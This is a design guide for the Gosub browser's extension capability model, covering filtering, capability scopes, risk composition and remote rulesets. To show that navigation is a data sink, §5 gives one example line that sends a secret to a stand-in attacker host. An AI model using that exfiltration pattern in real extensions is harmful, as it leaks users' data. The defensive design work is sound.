> This guide is based on the v2.1.10 version of the gosub-extension-capability-model-v2.1.10.md (registry v0.2.10). It replaces guide.md, which was written against v2.1.1. Same intent: a plain-language companion to the model, not a replacement for it — where this guide and the model disagree, the model wins.

# Overview

The premise: MV2 gives too much power to extensions (an adblocker could observe and modify every request), while MV3 confines this by using `declarativeNetRequest`: the extension gives the browser a set of rules, the browser does the matching, and the extension never sees the requests.

The problem is that MV3 bundled product-policy limits with that security change. Static rules are capped (30.000), EasyList alone exceeds 80.000, and there are other restrictions which make adblocking hard. Those limits are not security, they are policy that shipped in the same box.

Gosub mindset: **Powerful extensions do not require powerful extension code.**

Meaning: the browser (engine) provides the tools necessary for extensions to do their work, so those extensions do not need to carry those tools themselves. The engine provides building blocks (filtering, matching, statistics, form filling, scriptlets, command handling) that extensions *select and configure*. These building blocks are the ONLY gateway into pages.

Two framing points that run through the whole model:

- **The security boundary is the enforced capability set, not the install dialog.** The dialog exists so the user can give informed consent and so that what it says is *true*. But every guarantee holds whether or not the user reads it.
- **Manifests are input formats.** MV2/MV3 manifests are translated into capabilities + scopes. The capabilities are the security architecture; the manifest is syntax.

# Part I: Principles

## 1. Separate Extension Code from Filtering

The extension never filters itself. The browser does (gosub-baleen in the network layer for network filtering, in the renderer for cosmetic filtering). Extensions supply rules; they do not run during matching, are not on the request path, and do not receive the requests they affect. Only when an extension has been granted a capability to *see* something does it see something — an adblocker never needs that.

Consequence: a compromised extension worker cannot see traffic it was never given, and the filter machinery is shared, testable browser code.

## 2. Filtering Should Be Powerful — Within Budgets

Engineering budgets, not product policy:

- **compile-time budget:** rulesets that are too large or too expensive to compile are rejected. Yes, this is still a limit — but it is an engineering limit set far above any real list, not a 30.000-rule policy number.
- **match-time bound:** worst-case per-request cost is bounded. Regexes run on a linear-time engine (RE2-class, no catastrophic backtracking); the compiled artifact's transition graph is acyclic or step-capped so a valid artifact cannot hang the matcher.
- **memory cap:** per-extension resident budget, enforced at install and update.

## 3. Capabilities and Scopes

A `capability` is an operation (what does it do); a `scope` is its operand (on what does it do it).

    content_script(["*.example.com"])
    network.egress_public(["api.sponsorblock.example"])
    filtering.block(subresource, ["<all>"])

Host patterns, MIME types, request classes and origins are scopes; a host pattern is never itself a capability.

Scopes are **canonical**: `http://ExAmPLe.org` and `http://example.org:80` are the same scope. But canonicalization normalizes *representation*, it never *merges origins*: `localhost`, `127.0.0.1` and `[::1]` are three different origins and stay that way — collapsing them would widen a grant (`cookies.read(http://localhost)` must not reach `127.0.0.1`).

So there are two separate functions, and both sides (manifest translator and Sonar) use the same ones:

- `canonical_origin` → grant scoping. 127.0.0.1 is not localhost.
- `classify_address_space` → egress tiering / SSRF policy. Groups loopback, RFC-1918, link-local, public. Here we *want* widening: if loopback is denied, 127.0.0.2 must be denied too.

**Cookies get their own scope algebra** (new since v2.1.6): cookies are not port-scoped, `Domain=.example.com` cookies go to every subdomain, and a written cookie is something the browser *later emits*. So `cookies.write(scope)` is allowed only if every origin the cookie could be emitted to is inside the grant. Narrow grants can only set host-only cookies.

**Filtering scopes have two dimensions** (new in v2.1.10): `filtering.*(class, initiator_scope, destination_scope)` — which *pages* the rules run on, and which *requests* they affect. A blocker is `(sub, <all>, <all>)`; per-site revocation narrows the initiator side.

Scopes narrow monotonically: remove a capability for one scope, leave the others; or revoke the capability entirely. Without scope, there is no capability.

## 4. Security Dimensions of a Capability

Four axes:

    C Confidentiality -> what can it learn
    I Integrity       -> what can it change
    A Availability    -> what can it prevent
    U User intent     -> can it cause actions that normally need user interaction?

    filtering.block (subresource)     C:low   I:med    A:high  U:low
    input.raw_keys                    C:crit  I:low    A:low   U:low
    filtering.redirect (main_frame)   C:low   I:crit   A:high  U:high

Block is low-C / high-A (learns nothing, breaks things). A keylogger is the mirror image: critical-C / low-A (reads everything, breaks nothing). v1 only asked "can it read?" and mis-tiered blocking, redirection and declarative actions, which are integrity/availability/intent powers.

## 5. Capability Composition — Two Axes, One Principal

The risk of a capability *set* is not the max of its members. Risks compose.

A keylogger alone (`input.raw_keys`) is critical-C but its keystrokes go nowhere. An own-host fetch alone (`network.egress_public`) is a sender with nothing to send. Held together: `keystrokes × sink -> keystroke.exfiltration`, a working data-theft channel that exists only in the combination.

### Effect, not namespace

Labels attach to what a capability can *do*, never to which API it lives in. `tabs.navigate` is "tab management" — but `tabs.navigate("https://evil.example/?d=" + secret)` is a network request. So it is a sink.

Every registry entry carries four mandatory labels, validated at build time:

    source          what it can acquire: page_content, tab_urls, credentials,
                    keystrokes, pixels, selection, implicit_history, user_text, ...
    sink            where it can push bytes out: own_hosts, arbitrary_network,
                    probe, native_host, user_scripts, session_state
    command-source  who can feed decisions INTO it: user, packaged,
                    publisher_update, catalog_revision, remote_server,
                    webpage, native_process, enterprise_policy
    actuator        what it can DRIVE: filter_policy, dom, navigation,
                    browser_ui, session_state, extension_bridge, os

Rules of thumb the reviews forced:

- `content_script` (and `active_tab`) are `page_content + arbitrary_network` **by definition** — an isolated-world script shares the DOM and can create a network-loading node. "It only renders / only detects / only organizes" is never an exemption.
- A **sink is not only creating a request but also mutating one that was already going out** (v2.1.9): stripping a parameter, changing a header, blocking or allowing a request — all externally observable. A rule that does this *conditionally on something the destination cannot otherwise see* leaks that something.
- v2.1.10 made that precise as the **leak-free criterion**: a mutation is harmless iff (1) its predicate only uses facts the observer already holds (the request URL, method, headers as sent, first/third-party via `Sec-Fetch-Site`, the initiator where `Referer`/`Origin` carry it), and (2) the rule was installed by the package, a catalog revision, or user-typed text — **not chosen by the worker at runtime**. So `$3p` and `$domain=` on a `$removeparam` rule are fine (the server already sees that); a rule keyed on the *top-frame* identity for a request from a nested cross-origin frame is not.
- Clause (2) is why **`filtering.dynamic_rules` is an outbound sink** (v2.1.10): if the worker picks *which* rule to install at runtime, the choice itself carries information — install header-variant k of N, or block/unblock a beacon the publisher's server can see. Standard tier, `sink: own_hosts`, no egress grant needed. (The older "dynamic rules are a history *source* via a timing loop" label was withdrawn — nobody ever described the mechanism.)
- `cookies.write` is a *delayed* sink: the browser will later send those bytes in a `Cookie` header.
- `filtering.rewrite_url` (deletion-only query-parameter stripping, byte-spliced) is *not* a sink, because every byte it emits is a byte the page produced. Any substitution-style rewrite is a sink and does not exist below `filtering.redirect_*`.

### Axis 1: information flowing out

    page_content × any sink -> page.exfiltration
    tab_urls     × any sink -> history.exfiltration
    credentials  × any sink -> credential.exfiltration
    ... (a product for every source atom)

Any sink combined with `page_content` is labelled `page.exfiltration`, and the dialog leads with that: "Can send the contents of pages you visit to api.foo.example."

### Axis 2: command flowing in

    remote_server × filter_policy -> remote.filter_control
    remote_server × navigation    -> remote.navigation_control
    remote_server × os            -> remote.os_control
    webpage       × os            -> page.os_control   (web page -> extension -> native host)
    ... (a product for every command-source × actuator pair, closed in v2.1.10)

A command source combined with something it can drive is remote control, even if no data leaves. `egress(own) + dynamic_rules + block` is a remotely reprogrammable filter engine — every piece standard or silent, the combination a C2 channel.

**What counts as `remote_server`** has widened over the versions and is now: *any channel through which remotely chosen bytes reach extension code.* Readable fetch/WebSocket responses, but also push messages, a web page posting to the extension (`messaging.external_web`), a content script on an origin the publisher controls (the user visits publisher.example and the content script reads its instructions), a remote iframe in an extension page. A mutation capability (`dynamic_rules`) is only additionally needed to drive *declarative* filter policy; for a callable actuator (`tabs.navigate`, `downloads.create`, `cookies.write`) a readable channel is enough.

### The principal is the publisher, not the package

Both closures are computed over the **publisher** (the store-bound organizational identity — signing keys rotate beneath it) and over any **communicating set** (extensions sharing externally_connectable, a native-messaging bridge, or the same page's DOM-connected frame tree). Two co-published extensions, one with a source and one with a sink, hold `page.exfiltration` *jointly* and the dialog says so for both.

What we cannot detect: two *unrelated* publishers colluding through their own servers plus an OS covert channel — out of scope, handled by store-side signals. And the shared page realm (main world + DOM) is stated honestly as an essentially open channel between any two extensions that reach the same page; the controls are structural (loud tiers, no library scriptlet ever writes page data anywhere new) and it is owned by open question O7. The same-publisher closure is also only as strong as the store's identity proofing — one controller with two store accounts is two principals (O6).

# Part II — The Model

## 6. Separate Observing Traffic from Controlling Traffic

Controlling traffic = deciding what happens to a request (block, allow, redirect, strip a parameter, change a safe header): a verdict. Observing traffic = learning the URL, params, headers, body.

MV2 gave observation in order to give control. Gosub separates them: the browser decides the verdict from rules the extension supplied; the extension never sees the traffic. Observation still exists (`network.observe`, loud) for the cases that genuinely need it.

Control leaks through side effects unless constrained, so:

- **Redirect targets are static and classed.** Never built from regexes or rule-derived parts. A redirect is an *in-place response substitution* — `response.url` stays the original, no 30x to an extension URL (otherwise `fetch().url` hands the page the extension's identity). Passive targets (image, empty, static text) are `filtering.redirect_resource`. Executable surrogates split: a stub that only needs to *exist* (`noop.js`) runs in an isolated realm (no page storage, no postMessage, no network); a surrogate that must *define page globals* (`googletag`, `ga`) is main-world code and lives in the §8 scriptlet library under its rules and its tier.
- **URL rewriting is deletion-only and byte-level.** `$removeparam` tokenizes the raw query on `&`, decodes each token *once* for matching only, and splices the matched byte ranges out of the untouched original. No re-serialization, no insertion, no substitution. Standard tier for every request class (never silent) because a stripped CSRF/OAuth param "succeeds with altered meaning" and nobody notices.
- **Packaged-resource loads are unobservable** to the extension — no events, isolated cache state, no warm-up inference.
- **Extension-supplied CSS carries no attacker-chosen URL** — only packaged resources; every network-bearing CSS construct is rejected or rewritten. Raw arbitrary CSS is `styles.inject_raw`, loud.

## 7. Statistics and Feedback Channels

> Rendering a statistic is free. Reading a statistic is a capability.

- **`stats.display` (silent):** the browser renders the counter on the badge; the extension never receives the value. The tier to lean on.
- **`stats.read` (standard, `source: implicit_history`):** one dimensionless counter, total blocks across all rules and sites. Shape does not save it: ship one rule for one site and the global total *is* that site's visit count. So the real defense is an explicit **privacy budget** — added noise with a stated leakage bound, a budget that depletes with reads, no attacker-resettable baseline. The budget is **pooled per browser profile**, not per extension (per-extension budgets are defeated by shipping 100 one-rule extensions), partitioned regular/private, and rate-limited per extension so one extension cannot drain the pool. Quantization alone is not enough (prime the counter to a boundary and watch for +1). Precise noise parameters are O5.
- **`stats.per_rule` (loud):** per-rule counts are a history logger one rule away.

Noise keeps "1.4 million blocked" displayable while making single-visit detection cost O(weeks).

## 8. Native Cosmetic Filtering and Scriptlets

**Element hiding is a browser primitive.** Generic and per-site cosmetic rules compile into the renderer-side engine; extensions need no page access to hide elements. Hiding collapses (`display:none` semantics). It *is* observable in the page — and that is fine: the only extension contexts that could observe layout already hold `page_content` and could read the secret directly. Cosmetic stays `source: none`. (Earlier versions demanded compositor-level invisibility; v2.1.10 dropped that as both impossible and unnecessary.)

**Procedural filters are a closed DSL.** `##div:has-text(x):upward(2)` is data that selects browser-implemented, cost-bounded operators. Remote data may select and parameterize operators; it may never introduce new ones. Layout-aware operators and `:xpath` are out.

**Scriptlets — the big addition since v2.1.1.** `example.com##+js(set-constant, adsEnabled, false)` names an operator from a **browser-supplied, audited library** (`set-constant`, `abort-on-property-read`, `json-prune`, `prevent-fetch`, …) that the browser injects into the page's main world at document-start. `filtering.scriptlet` lets a list select and parameterize library entries; no extension code enters the page. This is what removes the last routine reason a blocker needs `content_script`.

Because the main world is where every sink lives, the library is governed by an **admission closure** rather than the word "audited": arguments are structured values (never interpolated into source), write *targets* are an allowlist by shape (a static path to an own data property on a plain object — never `location.*`, `document.cookie`, `__proto__`), write *values* are an allowlist by vocabulary (`false/true/null/undefined/''/0/noopFunc/...`, never an arbitrary string — else a page gadget like `cfg.returnUrl` becomes a sink), synthesized responses come from a fixed enum, no operator *moves* page data to a new location, no page-derived *predicate* controls an extension-observable effect (including timing), and the proof is closed under operator combination. Transitive effects are bounded by Rice's theorem: it is provable only for operators whose effect does not depend on page-defined accessors.

Tier: **loud until the per-operator proofs exist (O3), then standard — per ruleset.** Appendix D draws the line: write-only fixed-enum operators (`set-constant`, `set-attr`, `remove-attr`) can reach standard; every page-data-*reading* operator (`json-prune`, `prevent-fetch`, `no-setTimeout-if`, `abort-on-*`) is permanently loud. A stock uBO list uses both, so it lands loud. Anything outside the library is `page.main_world_inject` or `content_script`.

## 9. Remote Rulesets Are Remote Policy

A remotely fetched list is a *program* in the policy language of §6–8: a compromised list server changes browser behavior, and a server can serve different rules to different users (targeted policy).

    fetcher:   the browser — no extension cookies/headers, no redirects off origin
    verify:    bytes must match a signed hash that never comes from the list server
    freshness: past max-age the browser KEEPS the stale rules, shows the staleness
               visibly, retries mirrors, flags degraded after a grace window —
               hard-failing would fail filtering OPEN, which is what a withholding
               server wants
    schedule:  browser-controlled, jittered

Three coherent models:

- **A — package-pinned hash:** immutable; any list change needs a new extension package. Safest, static.
- **B — package-pinned key:** the publisher signs new versions; lists update at runtime — but this IS runtime remote filter control and composes as such (`egress × dynamic_rules`-class, loud).
- **C — catalog / transparency:** the UA or store approves each `(version, hash)` revision; the browser fetches exactly that object; the list server can only distribute bytes it cannot vary per user.

The model adopts **C**, and v2.1.10 added what was missing to make it honest: the package may only pin a **UA/store-trusted catalog** (a publisher key is model B); revisions live in an **append-only transparency log** and are accepted only with inclusion + consistency proofs (or witness co-signatures), so a catalog cannot quietly serve two views; and the catalog is an explicit `catalog_revision` command source whose compromise is a named global residual (O9).

> **Open disagreement (kept from guide.md):** my own preference was B (pragmatic for adblock lists) or A (safest), because C leaves a lot of work to the store/UA and — before v2.1.10 — put authorization in the hands of an approver with no transparency log. The log requirement answers the second objection; the first (who runs the catalogs for every regional/custom list?) is real and the model names it as a cost: publishers who cannot get a catalog fall back to package updates or the loud B-style pair. Still to be decided explicitly whether Gosub ships B as a loud, honestly-labelled option alongside C.

The precise guarantee the dialog may claim: *neither the publisher nor the list server can choose a per-user ruleset; filtering changes only through authenticated package updates, browser updates, or catalog revisions everyone receives alike.* Not "no runtime change between updates" — catalog revisions are legitimate runtime changes.

## 10. No Remotely Hosted Executable Code

Remote data may never become code in a privileged extension context.

- **Extension origin:** each extension is its own origin; pages cannot reach in, extensions cannot reach each other.
- **Extension CSP:** no remote scripts, no `eval`/`Function`, declared-package WASM only.
- **Workers & iframes:** same policy; untrusted content in sandboxed frames.
- **Cross-extension:** no ambient access; externally_connectable needs mutual declaration and forms a communicating set (authority computed over both).
- **user_scripts:** the one deliberate, gated exception; fetched content may not silently become a user script.

Honest limit: this stops remote *code*, not a remote *interpreter* — packaged code can interpret fetched JSON as a program. The CSP cannot decide that; the capability model contains it: whatever the interpreted program decides, it can only act through the grants held, and Axis 2 surfaces it.

## 11. Human-Readable Permissions

Manifests are translated to capabilities + scopes; derived authority (§5) is computed; the dialog leads with the derived lines, then capabilities, then what the extension *cannot* do where the contrast helps:

    uBlock-class blocker wants to:
        ✓ Block and hide ads and trackers on all sites
        ✓ Remove tracking parameters from web addresses
        ✓ Update its filter lists through the browser's list catalog
          (the same reviewed copy everyone receives)
        ✓ Show a blocked counter on its icon
        ✓ Apply filter rules you add yourself (custom filters, picker, per-site on/off)
        !  Run the browser's built-in ad-defusing scripts inside pages
           (reviewed scripts only; revocable per site)
        !  When you click its icon, it can read the current page and contact the network
        ✗ It cannot see the addresses you visit
        ✗ It cannot read pages unless you click it
        ✗ No server it talks to can choose different filtering for you
          than for anyone else

Marker semantics: `✓` = silent and standard capabilities (silent means auto-granted, not hidden); `!` = loud grants *and* any capability that derives an Axis-1/2 product by itself (which is why `active_tab` is `!`); `✗` = negative claims the closure proves over the whole set. Gated capabilities never appear — they are settings toggles.

Two caveats: the friendly lines are product glosses over effect-level grants ("Block ads" is `filtering.block` over arbitrary resources — there is no enforced category "ads"), and the dialog is *not* the boundary — the enforced capability set is.

## 12. Extension Workers and Private Browsing

Workers are event-driven; Gosub owns the runtime, so broker-managed durable state survives restarts and keepalive hacks are pointless.

Private browsing is a boundary:

    denied            default — no run, no events in private windows
    isolated          separate worker, memory-only storage, no BROWSER-PROVIDED
                      channel to the regular instance; per capability the private
                      instance is either denied or separately partitioned (a separate
                      store, never a prefixed key) — "shared read-only" is a channel
                      and is not a cell
    isolated_network  isolated, and NO SINK in private: every capability whose sink
                      label is not `none`, and every page-observable actuator, is
                      denied — computed from the registry, not listed in prose. That
                      covers content_script as a whole, cookies.write, dynamic_rules,
                      tabs.navigate, downloads.create. What remains is the sink-free,
                      page-inert subset (static filtering, cosmetic, stats.display,
                      storage.private, ui.*)
    spanning          one worker sees both — loud, discouraged

The guarantee is *no browser-provided state or channel* between instances. It does not claim network unlinkability (two instances phoning the same host can be correlated by IP + timing — that is why `isolated_network` exists). Chromium `incognito: split` → `isolated`, never nothing.

## 13. Grant Lifecycle

**Install: translation is pinned.** The manifest resolves to an explicit capability(scope) list with canonical scopes; that list is the grant. No wildcards; capabilities added to Gosub later never flow into old grants.

**Update: diff the effective sets, recompose warnings.** Any expansion (including removing a narrowing `gosub` manifest key) needs approval — but **the previous version keeps running under the previous grant meanwhile**; suspending a blocker until the user clicks is failing open. The closure is recomputed and the *delta* of derived warnings is shown. Reductions apply silently. A registry/model update that relabels a held capability also recomputes and re-surfaces newly derived products; it never widens enforcement.

**Revocation is a control-plane operation.** Effective immediately: matching rules and injections stop; state is disabled, not deleted (re-grant restores it); the revoke message travels a high-priority channel that pre-empts the worker event loop (a flooding worker cannot delay it); live documents are re-evaluated (contexts torn down or the tab reloaded with attribution); in-flight work is re-checked at a commit point — new effects cannot begin after revocation, bytes already on the wire cannot be unsent. One reversible exception: cookies an extension wrote are provenance-tagged and purged on revoke/uninstall. Survives updates; the extension gets a lifecycle event and fails closed.

**Grants bind to documents, and the renderer is the ground truth.** A site or activeTab grant is held against `(tab_id, frame_id, document_id, navigation_epoch, origin)`, carried in each execution payload and revalidated *by the renderer at execution time* (the broker checking and forwarding is a TOCTOU — the document can navigate in the gap). Teardown at cross-document navigation is frame-tree-wide; authority is not: a cross-origin child frame needs its own grant. Epochs are also revalidated on bfcache restore and prerender activation. `active_tab` is minted only by a browser-rendered gesture the extension cannot synthesize, covers the same-origin frame tree, survives `pushState`, ends at any cross-document navigation.

**Publisher identity is part of the model.** The principal is the store-bound organizational identity; signing keys rotate beneath it. Ordinary key rotation preserves the principal and must not break a legitimate same-publisher pair — but rotation is **authorized by the bound identity (store account), not by a chain signed with the old key** (a stolen key can sign that chain). Only an ownership transfer changes the principal → recompute closure → show newly derived authority → re-consent. Sideloaded extensions with no bound identity are singleton principals and never compose.

# Part III — Architecture

## 14. Baleen: the matching core

Baleen is the engine's URL-dispatch primitive, not an adblock component: one matching core, many namespaced tables (network verdicts, content-script injection, cosmetic selectors, egress scope checks, per-site grants, stats attribution), generic over verdict. Flat, offset-based, position-independent artifact; `mmap` is a validated-per-platform fast path, never an assumption.

The load-bearing invariant: **the artifact carries no authority.** A compiled table can be perfectly well-formed and still assert authority the extension was never granted (`bank.example -> set-constant(...)` under an `example.com` grant). So every consumer — Sonar, the renderer injector, the header/redirect engines — intersects each table entry with a trusted, separately produced `(extension_id, capability, granted_scope)` envelope at the point of effect, checked against the *effective destination*, per rule and per effect. The compiler never applies the envelope to its own output (a compromised compiler would skip it) and cannot emit into the grant/egress namespaces at all.

Validation assumes a compromised compiler: overflow-safe bounds, acyclic-or-step-capped transition graph (a valid artifact cannot hang the matcher), scriptlet sections re-validated against the §8 closure, bound-checked handles, a validator small enough to audit and a stated formal-verification target. Handover is sealed: a separate assembler owns the `memfd`, enforces §2 budgets while ingesting the compiler's stream, validates, seals, maps read-only; the compiler never holds a writable descriptor.

Build-vs-embed: embed `adblock-rust` as the phase-0 *verdict* oracle (not as the effect path — its `$removeparam`/header/redirect semantics predate §6/§15); write the Baleen core only if it misses a stated target by >20 % and profiling shows the gap is intrinsic.

## 15. Sonar integration

The network filter engine is a library inside Sonar's process (no per-request IPC). Hook points: pre-connect, pre-send, response-headers. Matching scope: URL, class, party, initiator origin, request/response headers — **never response bodies**.

**All extension egress routes through one policy keyed by effect**, not API: `fetch`, DOM-created `<img>`/iframe/form, a navigation, a tab-open, WebSocket, beacon, CSS `url()`, WebRTC, WebTransport, any raw socket — keyed on `(extension_id, initiator, destination)`. A transport the policy cannot mediate is denied, never exempt. One chokepoint, two grant families: transports are authorized against `network.egress_*(hosts)`; navigations against the navigation capability's own scope (http/https only, enumerated — no `javascript:`/`data:`/`blob:`).

    network.egress_public           public address space only
    network.egress_private_network  RFC 1918 / ULA — loud
    network.egress_loopback         gated

**Per-hop, both axes, socket binds to the checked address.** Every DNS resolution and every redirect hop re-runs the host-*scope* check (a redirect off the granted origin set must not widen an own-host grant) *and* the address-*space* check. Order: scope check on the unresolved origin → resolve → address-space check → `connect()` to the exact `SocketAddr` checked (never re-resolve by hostname). The DNS query is itself egress, so nothing out of scope is ever resolved. Authorization is per *logical request*, not per socket — connection reuse never substitutes for a check.

**Headers.** Modifiable set is a positively enumerated, versioned allowlist with an admission criterion: a header is writable only if setting/removing it has no UA-side fetch/navigate/store/trust/MIME/security effect (so never `Link`, `Refresh`, `Location`, `Set-Cookie`, `HSTS`, `CSP`, `Content-Type`, `XCTO`, CORS, `Host`, `Origin`, `Sec-*`, `Authorization`, `Cookie`…). A *static* value is not enough: `Link: <collector>; rel=preload` on `clinic.example` responses is history exfiltration to a third server. Values are RFC-9110 validated (CR/LF/NUL rejected) and each header is emitted as its own field line. The matchable set is narrower than the modifiable one (never `Authorization`/`Cookie`/`Set-Cookie`). Standard-tier header rules must satisfy the §5 leak-free criterion.

**One extension never filters another's traffic.** Requests from an extension's content script, injected frame or worker are attributed to that extension principal (and consume its egress grants); the page's own requests stay page traffic. Protected traffic (browser/extension updates, cert validation, other extension principals, `gosub://`) is never filtered.

## 16. The extension broker

A dedicated broker process mediates all extension authority and assumes a fully compromised worker. Identity is channel-bound: the broker creates each IPC endpoint and binds it to an extension identity; capability references are unforgeable (`SCM_RIGHTS` fds by preference, ≥128-bit connection-bound handles as fallback); renderer-side identity comes from process topology, never message fields.

Endpoints carry a trust level: the **worker** endpoint is compromised only if the extension is; a **content-script** endpoint lives in a page renderer, and a page that exploits the renderer *is* that content script. So content-script endpoints are renderer-trust — document-scoped operations only; egress, cookies, tabs, downloads, `dynamic_rules`, anything OS-touching is callable only from the worker.

The broker is boring: schema-generated fuzzed parser, fixed request/response pairs, capability × scope lookup (a Baleen table), document revalidation, forward. No JS runtime, no filter parser, no network, no filesystem. Compilation runs out-of-broker in a sandboxed, seccomp'd utility process.

## 17. Engine / user-agent split

> The engine enforces; the user agent decides and renders.

Engine: Baleen, filter engines, capability model and translation, broker, runtime, grant storage, counters, egress policy, header/socket correctness. UA: every pixel (dialogs, revocation UI, badges, attribution), grant policy and tier availability, distribution/signing/updates. Once a grant set is established, the engine enforces it independently of the embedder — a UA can auto-grant (its choice), it cannot widen enforcement or reach around the broker. User-trust surfaces (new-tab override, notifications, omnibox, capture, proxy, debugger) carry non-spoofable browser-owned attribution.

# Part IV — Compatibility

## 18. Manifest translation

`manifest.json` is an input dialect. Install-time translation produces the pinned capability(scope) list; never a wildcard; host permissions only mean something together with the API that uses them:

    host_permissions + scripting            -> content_script(hosts)
    host_permissions + webRequest[Blocking] -> network.observe(hosts)  [loud]
    host_permissions + cookies              -> cookies.read/write(hosts) [loud]
    host_permissions + extension fetch      -> network.egress_public(hosts)
    declarativeNetRequest                   -> filtering.block/allow/upgrade_scheme,
                                               redirect_resource/surrogate,
                                               headers.*, rewrite_url (removeParams)
    redirect.transform (other) / regexSubstitution -> dropped, never approximated
    declarativeNetRequestFeedback           -> stats.per_rule [loud]
    activeTab                               -> content_script.active_tab
    incognito: split                        -> extension.private_browsing: isolated

Filter-list syntax expands the same way: `$removeparam` → `rewrite_url`; `##+js(name,…)` → `filtering.scriptlet` if `name` is in the browser library, else needs `content_script`/`page.main_world_inject`; `$3p`/`$domain=`/`initiatorDomains` are kept where the predicate is leak-free and split off as a loud residue where it is not; `$csp`/`$permissions`/`$urltransform`/`$replace`/`$urlskip` are dropped. The compiler reports the residue so a publisher sees exactly what a broader grant would buy.

An optional `gosub` manifest key may only *narrow* the translated set; removing it in an update is an expansion. Avoid a Gosub-only manifest as the primary format (Safari tried).

## 19. Capability registry (v0.2.10)

Tiers: `silent` (auto-granted, still disclosed) · `standard` (named, consented at install) · `loud` (explicit consent, per-site revocable, derived warnings) · `gated` (settings/developer toggle). Every entry carries source / sink / command-source / actuator, build-validated against the §5 enums.

The families, with the entries worth knowing by name:

- **Filtering:** `block` (sub silent / main_frame standard), `allow` (this extension's rules only), `upgrade_scheme`, `redirect_resource`/`_surrogate`, `headers.*` (allowlist, leak-free), `cosmetic`/`procedural` (silent), `dynamic_rules` (standard; `sink: probe + own_hosts`, `actuator: filter_policy`), `remote_rulesets` (model C, `command-source: catalog_revision`), `rewrite_url` (standard, all classes), `scriptlet` (loud until O3 / per-ruleset standard).
- **Stats:** `display` (silent), `read` (standard, budgeted), `per_rule` (loud).
- **Networking:** `egress_public/private_network/loopback`, `observe` (loud), `proxy_control` (gated, `source: browser_traffic`).
- **Page access:** `content_script` (loud; `page_content + arbitrary_network`, `command-source: webpage`), `content_script.active_tab` (standard, gesture-minted), `page.main_world_inject`, `dom.declarative_actions` (standard only for provably passive ops), `dom.actions_arbitrary` (loud), `styles.inject_safe/raw`, `forms.detect_credentials`/`fill` (browser-managed store, fresh gesture, browser chooses the credential), `forms.read` (loud), `input.commands`/`raw_keys`, `content_handler(origin, mimes)`, `context.*`.
- **Capture, tabs, downloads:** `capture.tab_pixels/video` (loud), `tabs.snapshot`/`events`/`organize`/`open`/`navigate` (navigate = sink on its own), **`tabs.restore(handle)`** — browser-managed tab store so a tab manager can reopen tabs without choosing URL bytes (keeps OneTab out of `history.exfiltration`), `downloads.create/history/control/open`.
- **Storage & cookies:** `storage.private` (silent), `managed` (gated, enterprise), `sync`; `cookies.read/write` (loud, cookie scope algebra; write is a `session_state` sink+actuator), `read_httponly` (gated).
- **Messaging (new in v0.2.10):** `messaging.external_web(origins)` (web page → extension; `command-source: webpage`), `messaging.push` (remote bytes with no egress grant), `messaging.external_extension`.
- **Browser UI / devtools / system:** `ui.*`, `omnibox.*`, `devtools.network/dom/inspected_eval`, `clipboard.read/write`, `extensions.list` (gated co-install oracle), `system.native_messaging` (gated; denied in private), `system.user_scripts` (gated), `extension.private_browsing`, `scheduling`.

# Open questions (short form)

- **O1** Baleen build-vs-embed — threshold stated, awaits benchmarks.
- **O2** Exhaustive WebExtension API list (identity, history/webNavigation/sessions, bookmarks, browsingData, contentSettings, debugger, … still unregistered).
- **O3** Launch procedural/scriptlet operator set, each proven against the §8 closure; Appendix D has the shortlist.
- **O4** Privileged / first-party extensions.
- **O5** Stats privacy-budget parameters (noise distribution, leakage bound, pooled + partitioned + per-extension rate-limited).
- **O6** Signing/trust mechanism; store identity proofing as the dependency of the same-publisher closure; catalog transparency log / witnesses.
- **O7** Covert channels: shared page realm between unrelated publishers (essentially open), pooled stats budget, storage/cache/DNS/timing.
- **O8** Enforcement rigour as proof obligations (validator, scriptlet library, broker parser).
- **O9** Named, bounded residuals: socket-routing TOCTOU, remote-list grace window, catalog compromise (global, non-targeted), revocation commit residual.
